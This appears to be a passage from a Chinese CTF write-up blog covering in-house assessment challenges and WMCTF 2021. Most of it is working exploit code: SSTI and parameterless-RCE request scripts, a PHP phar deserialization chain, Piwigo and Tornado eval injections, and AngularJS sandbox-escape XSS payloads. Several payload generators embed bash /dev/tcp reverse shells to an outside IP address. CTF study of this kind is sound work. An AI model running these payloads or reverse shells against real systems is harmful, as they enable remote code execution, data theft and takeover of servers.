<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217104536108.png" alt="image-20201217104536108"></p>
<p>这里使用跑的是popen的方法，<code>os._wrao_close</code>索引为117，但有个小坑最后的flag文件不能够直接读到，会提示如下，但发现base64编码后即可读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;flag&#39; in result !!!Bighack</span><br></pre></td></tr></table></figure>

<p>这里直接给个exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8960/?name=&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbases\\x5f\\x5f&quot;][0][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[117][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;popen&quot;](&quot;cat /fl4g|base64&quot;)[&quot;read&quot;]()&#125;&#125;&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&quot;Hello (.*)&quot;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217112138434.png" alt="image-20201217112138434"></p>
<h3 id="web12-考核"><a href="#web12-考核" class="headerlink" title="web12-考核"></a>web12-考核</h3><p>题目源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>比较简单的一道题，无参数RCE，先读取目录文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(4) &quot;.git&quot; [3]&#x3D;&gt; string(5) &quot;1.php&quot; [4]&#x3D;&gt; string(8) &quot;flag.php&quot; [5]&#x3D;&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>

<p>发现<code>flag.php</code>在倒数第二个位置上面，用反转数组再<code>next</code>读下一个即可</p>
<p>这里直接给个exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8873/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&quot;0\&quot;&gt;&#x27;(.*)&#x27;&lt;/span&quot;</span>,response.text)[<span class="number">1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217115235793.png" alt="image-20201217115235793"></p>
<h3 id="web4-考核"><a href="#web4-考核" class="headerlink" title="web4-考核"></a>web4-考核</h3><p>一开始打开题目啥都没，给了个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key：e086aa137fa19f67d27b39d0eca18610</span><br></pre></td></tr></table></figure>

<p>md5解密后为：1.1.1.1，抓包加XFF头：<code>X-Forwarded-For:1.1.1.1</code>，然后就可以得到：<code>dhudndrgrhs.php</code></p>
<p>访问得到题目源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;print_r&quot;</span>,<span class="string">&quot;system&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;ini_set&quot;</span>, <span class="string">&quot;scandir&quot;</span>, <span class="string">&quot;exec&quot;</span>,<span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;error_log&quot;</span>, <span class="string">&quot;ini_alter&quot;</span>, <span class="string">&quot;ini_set&quot;</span>, <span class="string">&quot;pfsockopen&quot;</span>, <span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;symlink&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;fpassthru&quot;</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;xmctf&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]);</span><br></pre></td></tr></table></figure>

<p>本题数组合并把一个数组的函数和php的内置函数一起作为黑名单，然后有个eval的参数是可以任意控制的，一看就知道用构造无字符去绕过了，这种题遇见过很多次了，随便拿个payload打打即可</p>
<p>这里直接给个exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8979/dhudndrgrhs.php&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?shell=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat flag.php&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217134249722.png" alt="image-20201217134249722"></p>
<h3 id="web6-考核"><a href="#web6-考核" class="headerlink" title="web6-考核"></a>web6-考核</h3><p>看到页面有个<code>download.php</code>，扫描目录有个<code>class.php</code>，但是有个正则过滤了class，用斜杠绕过即可下载下来，源码如下</p>
<p><code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|flag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>又找到有个<code>file.php</code>，看到有个<code>file_exists</code>，这个函数可以使用phar协议，然后又有文件上传，满足这几个条件的话phar反序列化八九不离十了，主要是怎么构造反序列化的链条</p>
<p>这里首先看到Show类<code>__toString</code>方法里面有个<code>file_get_contents</code>可以读取文件，这个地方应该是链条的终点，然后调用<code>__toString</code>方法的话一般是<code>echo</code>对象或者字符串对比啥的，然后看到S6ow类有个<code>file_get</code>里面有个<code>echo</code>，这里可以调用<code>__toString</code>方法，然后就要想办法调用<code>file_get</code></p>
<p>这里可以先看到有个<code>__call</code>和<code>__get</code>，可以通过<code>__get</code>去调用<code>file_get</code>，然后调用<code>__get</code>需要不可访问的变量，这时候可以用<code>__call</code>去触发，最后在<code>__call</code>的调用需要用到<code>Sh0w</code>的<code>__destruct</code>中访问<code>_show()</code>，我们可以设置str为S6ow，而S6ow缺少<code>_show()</code>方法从而调用<code>__call</code></p>
<p>链条加上生成phar文件的payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params[<span class="string">&#x27;_show&#x27;</span>]=<span class="string">&#x27;file_get&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> s6ow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$Sh0w = <span class="keyword">new</span> Sh0w();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($Sh0w); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将生成的<code>phar.phar</code>重命名为<code>phar.jpg</code>上传，计算一下md5值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">&#x27;phar.jpg&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//628941e623f5a967093007bf39be805f</span></span><br></pre></td></tr></table></figure>

<p>最后在<code>file.php</code>用phar协议去触发我们的反序列化即可，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xmctf.top:8874&#x2F;file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;628941e623f5a967093007bf39be805f.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217191850645.png" alt="image-20201217191850645"></p>
<p>base64解码之后即可得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmctf&#123;ph4r_s3r1al1z3_1s_fu9!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>考核</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF 2021</title>
    <url>/2021/09/08/WMCTF%202021/</url>
    <content><![CDATA[<p>复现一下🙃<a id="more"></a></p>
<h1 id="ez-piwigo"><a href="#ez-piwigo" class="headerlink" title="ez piwigo"></a>ez piwigo</h1><p><code>admin</code>弱口令直接进入后台，看到<code>LocalFiles Editor</code>插件里看到<code>admin.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Piwigo&#x2F;LocalFilesEditor&#x2F;blob&#x2F;96ddd392a14ae2caef3416b379c0868610d2d15f&#x2F;admin.php#L81</span><br></pre></td></tr></table></figure>

<p>此处的<code>eval_syntax</code>函数的参数可控，跟进<code>eval_syntax()</code>方法，发现<code>$code</code>参数会拼接到<code>eval</code>函数里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eval &#x3D; eval(&#39;if(0)&#123;&#39; . $code . &#39;&#125;&#39;);</span><br></pre></td></tr></table></figure>

<p>可以闭合原语句来注入<code>PHP</code>语句，<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;;system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip 0&gt;&amp;1&quot;&#x27;</span>);<span class="keyword">if</span>(<span class="number">0</span>)&#123;</span><br></pre></td></tr></table></figure>

<h1 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h1><h2 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h2><p>首先本题<code>F12</code>进入<code>/view</code>之后可以看到模板</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if test &#x3D;&#x3D; lucky_number %&#125;</span><br><span class="line">	&lt;div class&#x3D;&quot;center&quot;&gt;You&#39;re so lucky&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">	&lt;div class&#x3D;&quot;center&quot;&gt;You&#39;re not lucky enough&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% end %&#125;</span><br></pre></td></tr></table></figure>

<p>会将我们输入的值直接加载进模板，然后和<code>lucky_number</code>比较</p>
<p>这里<code>tornado</code>解析模板是直接拼接的代码</p>
<p>这里可以构造类似<code>a1=str(bytearray([xx]))[-3:-2]</code>依次构造字符串</p>
<p>最后构造<code>eval(a1+a2+a3)</code>执行代码，生成脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;bash -c \&#x27;exec bash -i &amp;&gt;/dev/tcp/134.175.168.213/1234 &lt;&amp;1\&#x27;&quot;)&#x27;</span>;</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$eval = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">	$result .= <span class="string">&#x27;a&#x27;</span>.$i.<span class="string">&#x27;=str(bytearray([0x&#x27;</span>.bin2hex($a[$i]).<span class="string">&#x27;]))[-3:-2]&#x27;</span>.PHP_EOL;</span><br><span class="line">	$eval = $eval.<span class="string">&#x27;a&#x27;</span>.$i.<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> substr($result,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;eval(&#x27;</span>.substr($eval,<span class="number">0</span>,<span class="number">-1</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Nu1L战队解法"><a href="#Nu1L战队解法" class="headerlink" title="Nu1L战队解法"></a><code>Nu1L</code>战队解法</h2><p>直接用<code>unicode normalize</code>，导致 <code>exec</code> 可以执行 <code>unicode</code> 代码</p>
<p>可以利用特殊的字符绕过<code>waf</code>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ᵉˣᵉᶜ</span><br><span class="line">𝑒𝑥𝑒𝑐</span><br></pre></td></tr></table></figure>

<p>生成脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;import os;os.system(&quot;bash -c \&#x27;exec bash -i &amp;&gt;/dev/tcp/134.175.168.213/1234 &lt;&amp;1\&#x27;&quot;)&#x27;</span>;</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">	$result .= <span class="string">&#x27;bytes([&#x27;</span>.ord($a[$i]).<span class="string">&#x27;])+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> substr($result,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了队里<code>r2</code>师傅的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">function=<span class="string">&quot;exec&quot;</span></span><br><span class="line">args=<span class="string">&#x27;import os;os.system(&quot;calc&quot;)&#x27;</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> function:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        <span class="keyword">if</span> ch!=chr(i) <span class="keyword">and</span> unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>,chr(i))==ch:</span><br><span class="line">            payload+=chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">payload+=<span class="string">&quot;(&quot;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> args:</span><br><span class="line">    payload+=<span class="string">&quot;bytes([%d])+&quot;</span>%(ord(ch))</span><br><span class="line">payload=payload[:len(payload)<span class="number">-1</span>]</span><br><span class="line">payload+=<span class="string">&quot;)&quot;</span></span><br><span class="line">print(payload)</span><br><span class="line">eval(payload)</span><br></pre></td></tr></table></figure>

<h1 id="granddad’s-guestbook"><a href="#granddad’s-guestbook" class="headerlink" title="granddad’s guestbook"></a>granddad’s guestbook</h1><p>本题所欠缺的知识：</p>
<p><code>AngularJS</code>是一个著名的基于<code>JavaScript</code>的开源<code>Web</code>框架，用于前端编程</p>
<p><code>Angular&lt;1.6</code>内的典型<code>XSS payload</code>如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>payload</code>成功执行，结果<code>49</code>将会出现</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/angular.js/1.1.5/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span>&#123;&#123; 7 * 7 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面是一些 <code>AngularJS</code> 绕过的 <code>Payload</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.0.1 - 1.1.5</span></span><br><span class="line">&#123;&#123;constructor.constructor(<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.0 - 1.2.1</span></span><br><span class="line">&#123;&#123;a=<span class="string">&#x27;constructor&#x27;</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.2 - 1.2.5</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].charAt=<span class="string">&#x27;&#x27;</span>.valueOf;$eval(<span class="string">&quot;x=&#x27;&quot;</span>+(y=<span class="string">&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;</span>)+<span class="built_in">eval</span>(y)+<span class="string">&quot;&#x27;&quot;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.6 - 1.2.18</span></span><br><span class="line">&#123;&#123;(_=<span class="string">&#x27;&#x27;</span>.sub).call.call(&#123;&#125;[$=<span class="string">&#x27;constructor&#x27;</span>].getOwnPropertyDescriptor(_.__proto__,$).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.19 - 1.2.23</span></span><br><span class="line">&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;alert(1)&quot;</span>].sort(toString.constructor);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span 